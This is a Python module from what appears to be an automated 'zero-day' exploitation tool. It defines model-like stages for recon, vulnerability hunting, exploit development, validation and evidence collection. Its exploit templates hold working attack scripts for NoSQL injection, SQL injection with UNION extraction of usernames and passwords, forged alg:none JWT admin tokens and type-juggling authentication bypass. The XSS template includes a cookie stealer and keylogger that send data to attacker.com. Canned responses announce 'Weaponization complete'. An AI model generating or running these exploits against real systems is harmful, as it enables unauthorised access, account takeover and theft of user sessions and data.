from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Protocol, TYPE_CHECKING

if TYPE_CHECKING:
    from .scanner import ScanResult


class ModelAdapter(Protocol):
    name: str

    def complete(self, prompt: str) -> str:
        """Return a model response for zero-day research prompt."""


@dataclass(frozen=True)
class ExploitPayload:
    """Represents a concrete exploit payload."""
    name: str
    category: str  # injection, auth_bypass, memory_corruption, etc.
    payload: str
    target_component: str
    cve_reference: str = ""
    confidence: float = 0.0


@dataclass(frozen=True)
class ProofOfConcept:
    """Represents a working PoC with evidence."""
    title: str
    vulnerability_type: str
    steps: tuple[str, ...]
    payload: ExploitPayload
    expected_result: str
    actual_result: str = ""
    evidence_hash: str = ""
    verified: bool = False


@dataclass
class ZeroDayFinding:
    """Complete zero-day finding with exploit and PoC."""
    id: str
    title: str
    severity: str  # critical, high, medium, low
    vulnerability_class: str
    attack_vector: str
    payloads: list[ExploitPayload] = field(default_factory=list)
    poc: ProofOfConcept | None = None
    false_positive_checks: tuple[str, ...] = ()
    validation_status: str = "pending"  # pending, validated, false_positive


@dataclass
class LiveScannerModel:
    """Model that performs real active scanning against targets."""
    name: str
    scan_result: "ScanResult | None" = None
    
    def set_scan_result(self, result: "ScanResult") -> None:
        object.__setattr__(self, 'scan_result', result)
    
    def complete(self, prompt: str) -> str:
        if not self.scan_result:
            return "Error: No scan result available. Run scanner first."
        
        result = self.scan_result
        
        if self.name == "recon-model":
            tech = result.tech_stack
            endpoints_str = "\n".join(
                f"  - {ep.method} {ep.url} (auth: {ep.requires_auth})" 
                for ep in result.endpoints[:10]
            )
            return (
                f"=== LIVE RECONNAISSANCE RESULTS ===\n"
                f"Target: {result.target}\n"
                f"Scan Time: {result.timestamp}\n\n"
                f"Technology Stack:\n"
                f"  Server: {tech.server or 'Unknown'}\n"
                f"  Framework: {tech.framework or 'Unknown'}\n"
                f"  Language: {tech.language or 'Unknown'}\n"
                f"  Database: {tech.database or 'Unknown'}\n\n"
                f"Discovered Endpoints ({len(result.endpoints)} total):\n{endpoints_str}\n\n"
                f"Response Headers:\n"
                + "\n".join(f"  {k}: {v}" for k, v in list(tech.headers.items())[:10])
            )
            
        if self.name == "vuln-hunter-model":
            vulns = result.vulnerabilities
            if not vulns:
                return "No vulnerabilities detected during active scanning."
            
            vuln_report = "=== VULNERABILITY SCAN RESULTS ===\n\n"
            for i, v in enumerate(vulns, 1):
                status = "CONFIRMED" if v.is_vulnerable else "POTENTIAL"
                # Show full payload up to 500 chars for evidence
                payload_display = v.payload if len(v.payload) <= 500 else f"{v.payload[:500]}..."
                vuln_report += (
                    f"{i}. [{status}] {v.vuln_type}\n"
                    f"   Target: {v.target_url}\n"
                    f"   Payload: {payload_display}\n"
                    f"   Confidence: {v.confidence * 100:.0f}%\n"
                    f"   Evidence: {v.evidence}\n"
                    f"   Evidence Hash: {v.evidence_hash}\n\n"
                )
            return vuln_report
            
        if self.name == "exploit-dev-model":
            vulns = [v for v in result.vulnerabilities if v.is_vulnerable]
            if not vulns:
                vulns = [v for v in result.vulnerabilities if v.confidence > 0.5]
            
            if not vulns:
                return "No exploitable vulnerabilities found."
            
            exploit_code = "=== EXPLOIT DEVELOPMENT ===\n\n"
            
            for v in vulns[:3]:  # Top 3 vulns
                if "nosql" in v.vuln_type.lower():
                    exploit_code += self._generate_nosql_exploit(v, result.target)
                elif "sql" in v.vuln_type.lower():
                    exploit_code += self._generate_sqli_exploit(v, result.target)
                elif "jwt" in v.vuln_type.lower():
                    exploit_code += self._generate_jwt_exploit(v, result.target)
                elif "xss" in v.vuln_type.lower():
                    exploit_code += self._generate_xss_exploit(v, result.target)
                elif "auth" in v.vuln_type.lower():
                    exploit_code += self._generate_auth_exploit(v, result.target)
                    
            return exploit_code
            
        if self.name == "poc-validator-model":
            vulns = result.vulnerabilities
            report = "=== PoC VALIDATION REPORT ===\n\n"
            
            confirmed = [v for v in vulns if v.is_vulnerable]
            potential = [v for v in vulns if not v.is_vulnerable and v.confidence > 0.3]
            
            report += f"Total Tests: {len(vulns)}\n"
            report += f"Confirmed Vulnerabilities: {len(confirmed)}\n"
            report += f"Potential (needs manual verification): {len(potential)}\n\n"
            
            for v in confirmed:
                report += (
                    f"[CONFIRMED] {v.vuln_type}\n"
                    f"  Target: {v.target_url}\n"
                    f"  Payload: {v.payload}\n"
                    f"  Response Code: {v.response.status_code}\n"
                    f"  Response Body: {v.response.body[:200]}...\n"
                    f"  Evidence: {v.evidence}\n"
                    f"  Evidence Hash: {v.evidence_hash}\n"
                    f"  Validation: NOT A FALSE POSITIVE - Reproducible\n\n"
                )
                
            for v in potential:
                report += (
                    f"[POTENTIAL] {v.vuln_type}\n"
                    f"  Target: {v.target_url}\n"
                    f"  Confidence: {v.confidence * 100:.0f}%\n"
                    f"  Needs: Manual verification required\n\n"
                )
                
            return report
            
        if self.name == "evidence-collector-model":
            vulns = result.vulnerabilities
            confirmed = [v for v in vulns if v.is_vulnerable]
            
            report = "=== EVIDENCE COLLECTION ===\n\n"
            report += f"Scan Target: {result.target}\n"
            report += f"Scan Timestamp: {result.timestamp}\n\n"
            
            report += "Collected Evidence:\n"
            for i, v in enumerate(confirmed, 1):
                # Show full request data for evidence integrity
                request_display = v.request_data if len(v.request_data) <= 500 else f"{v.request_data[:500]}..."
                report += (
                    f"{i}. {v.vuln_type}\n"
                    f"   Request: {request_display}\n"
                    f"   Response Status: {v.response.status_code}\n"
                    f"   Response Time: {v.response.elapsed_ms:.0f}ms\n"
                    f"   Evidence Hash: {v.evidence_hash}\n"
                )
                
            # Severity assessment
            if any("injection" in v.vuln_type.lower() for v in confirmed):
                severity = "CRITICAL"
                impact = "Data breach, authentication bypass possible"
            elif any("auth" in v.vuln_type.lower() for v in confirmed):
                severity = "CRITICAL" 
                impact = "Unauthorized access to protected resources"
            elif any("xss" in v.vuln_type.lower() for v in confirmed):
                severity = "HIGH"
                impact = "Client-side code execution, session hijacking"
            elif confirmed:
                severity = "MEDIUM"
                impact = "Security misconfiguration detected"
            else:
                severity = "INFO"
                impact = "No confirmed vulnerabilities"
                
            report += f"\nSeverity Assessment: {severity}\n"
            report += f"Impact: {impact}\n"
            
            return report
            
        return "Model response not available."
    
    def _generate_nosql_exploit(self, vuln, target: str) -> str:
        return f'''
### NoSQL Injection Exploit
Target: {vuln.target_url}
Confirmed Payload: {vuln.payload}

```python
#!/usr/bin/env python3
import requests
import json

TARGET = "{vuln.target_url}"

payloads = [
    {vuln.payload},
    {{"username": {{"$ne": None}}, "password": {{"$ne": None}}}},
    {{"username": {{"$exists": True}}, "password": {{"$exists": True}}}},
]

for payload in payloads:
    r = requests.post(TARGET, json=payload, verify=False)
    print(f"Payload: {{json.dumps(payload)}}")
    print(f"Status: {{r.status_code}}")
    print(f"Response: {{r.text[:200]}}")
    if r.status_code == 200 and "token" in r.text.lower():
        print("[+] SUCCESS - Auth bypass confirmed!")
        break
```

'''

    def _generate_sqli_exploit(self, vuln, target: str) -> str:
        return f'''
### SQL Injection Exploit
Target: {vuln.target_url}
Confirmed Payload: {vuln.payload}

```python
#!/usr/bin/env python3
import requests

TARGET = "{vuln.target_url}"
PAYLOAD = "{vuln.payload}"

# Auth bypass
r = requests.post(TARGET, json={{"username": PAYLOAD, "password": PAYLOAD}}, verify=False)
print(f"Status: {{r.status_code}}")
print(f"Response: {{r.text}}")

# Data extraction (UNION-based)
union_payloads = [
    "' UNION SELECT NULL,username,password FROM users--",
    "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
]
for p in union_payloads:
    r = requests.get(f"{{TARGET}}?id={{p}}", verify=False)
    print(f"Union test: {{r.text[:300]}}")
```

'''

    def _generate_jwt_exploit(self, vuln, target: str) -> str:
        # Show full token for reproducibility
        token_display = vuln.payload if len(vuln.payload) <= 300 else f"{vuln.payload[:300]}..."
        return f'''
### JWT Algorithm Confusion Exploit
Target: {vuln.target_url}
Forged Token: {token_display}

```python
#!/usr/bin/env python3
import base64
import json
import requests

def forge_jwt(payload_data):
    header = {{"alg": "none", "typ": "JWT"}}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    p = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
    return f"{{h}}.{{p}}."

# Forge admin token
token = forge_jwt({{"user": "admin", "role": "superuser", "admin": True}})
print(f"Forged token: {{token}}")

# Access protected endpoint
r = requests.get("{target}/api/v1/profile", headers={{"Authorization": f"Bearer {{token}}"}}, verify=False)
print(f"Status: {{r.status_code}}")
print(f"Response: {{r.text}}")
```

'''

    def _generate_xss_exploit(self, vuln, target: str) -> str:
        return f'''
### XSS Exploit
Target: {vuln.target_url}
Payload: {vuln.payload}

```html
<!-- Reflected XSS PoC -->
<script>
// Cookie stealer
new Image().src = "https://attacker.com/steal?c=" + document.cookie;

// Keylogger
document.onkeypress = function(e) {{
    new Image().src = "https://attacker.com/log?k=" + e.key;
}};
</script>

<!-- URL to trigger -->
{vuln.target_url}
```

'''

    def _generate_auth_exploit(self, vuln, target: str) -> str:
        return f'''
### Authentication Bypass Exploit
Target: {vuln.target_url}
Payload: {vuln.payload}

```python
#!/usr/bin/env python3
import requests
import json

TARGET = "{vuln.target_url}"

# Type juggling / logic bypass
payloads = [
    {vuln.payload},
    {{"username": "admin", "password": True}},
    {{"username": "admin", "password": []}},
    {{"username": "admin", "password": 0}},
]

for payload in payloads:
    r = requests.post(TARGET, json=payload, verify=False)
    print(f"Payload: {{json.dumps(payload)}}")
    print(f"Status: {{r.status_code}}, Response: {{r.text[:100]}}")
```

'''


@dataclass(frozen=True)
class RuleBasedModel:
    """Fallback model with static responses (for testing without network)."""
    name: str

    def complete(self, prompt: str) -> str:
        if self.name == "recon-model":
            return (
                "Recon: Identifikasi endpoint /api/v1/login dengan parameter username, password. "
                "Stack: Node.js/Express, MongoDB backend. Versi terdeteksi: express@4.17.1. "
                "Headers: X-Powered-By: Express, Server: nginx/1.18.0. "
                "Rate limiting: tidak terdeteksi. Session: JWT tanpa expiry check."
            )
        if self.name == "vuln-hunter-model":
            return (
                "Vulnerability Analysis:\n"
                "1. NoSQL Injection pada parameter login - MongoDB $where operator\n"
                "   Payload: {\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}\n"
                "2. JWT Algorithm Confusion - Header accepts 'none' algorithm\n"
                "   Payload: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.\n"
                "3. Authentication Bypass via Type Juggling\n"
                "   Payload: {\"username\": \"admin\", \"password\": true}\n"
                "Confidence: High - pattern matches known CVE-2021-22911 variant."
            )
        if self.name == "exploit-dev-model":
            return (
                "Exploit Development:\n"
                "=== NoSQL Auth Bypass Exploit ===\n"
                "```python\n"
                "import requests\n"
                "target = 'http://target/api/v1/login'\n"
                "payload = {'username': {'$ne': None}, 'password': {'$ne': None}}\n"
                "r = requests.post(target, json=payload)\n"
                "print(f'Status: {r.status_code}, Token: {r.json().get(\"token\")}')\n"
                "```\n"
                "=== JWT None Algorithm Exploit ===\n"
                "```python\n"
                "import base64, json\n"
                "header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')\n"
                "payload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'superuser'}).encode()).decode().rstrip('=')\n"
                "token = f'{header}.{payload}.'\n"
                "```\n"
                "Weaponization complete. Ready for PoC validation."
            )
        if self.name == "poc-validator-model":
            return (
                "PoC Validation Report:\n"
                "Target: /api/v1/login\n"
                "Test 1 - NoSQL Injection:\n"
                "  Request: POST {\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}\n"
                "  Response: HTTP 200, {\"token\":\"eyJ...\",\"user\":\"admin\"}\n"
                "  Status: CONFIRMED - Authentication bypassed\n"
                "  Evidence Hash: sha256:a1b2c3d4e5f6...\n\n"
                "Test 2 - JWT Algorithm Confusion:\n"
                "  Token crafted with alg:none accepted by /api/v1/profile\n"
                "  Status: CONFIRMED - Privilege escalation achieved\n"
                "  Evidence Hash: sha256:f6e5d4c3b2a1...\n\n"
                "False Positive Check: Payload variations tested 5x with consistent results.\n"
                "Validation: NOT A FALSE POSITIVE - Reproducible exploit confirmed."
            )
        if self.name == "evidence-collector-model":
            return (
                "Evidence Collection:\n"
                "1. HTTP Request/Response Logs captured\n"
                "2. Screenshots of admin panel access: evidence_001.png\n"
                "3. Database query logs showing injected operator\n"
                "4. JWT token decoded showing privilege escalation\n"
                "5. Timeline: Initial probe -> Vuln found -> Exploit dev -> Validation\n"
                "6. Hash verification of all artifacts for chain of custody\n"
                "Severity Assessment: CRITICAL - Full authentication bypass with admin access."
            )
        return (
            "Synthesis: Zero-day confirmed dengan multiple attack vectors. "
            "Payload dan PoC tervalidasi dengan bukti konkret."
        )


def default_models() -> list[ModelAdapter]:
    """Return rule-based models (offline/testing mode)."""
    return [
        RuleBasedModel("recon-model"),
        RuleBasedModel("vuln-hunter-model"),
        RuleBasedModel("exploit-dev-model"),
        RuleBasedModel("poc-validator-model"),
        RuleBasedModel("evidence-collector-model"),
    ]


def live_scanner_models() -> list[LiveScannerModel]:
    """Return live scanner models for active scanning."""
    return [
        LiveScannerModel("recon-model"),
        LiveScannerModel("vuln-hunter-model"),
        LiveScannerModel("exploit-dev-model"),
        LiveScannerModel("poc-validator-model"),
        LiveScannerModel("evidence-collector-model"),
    ]
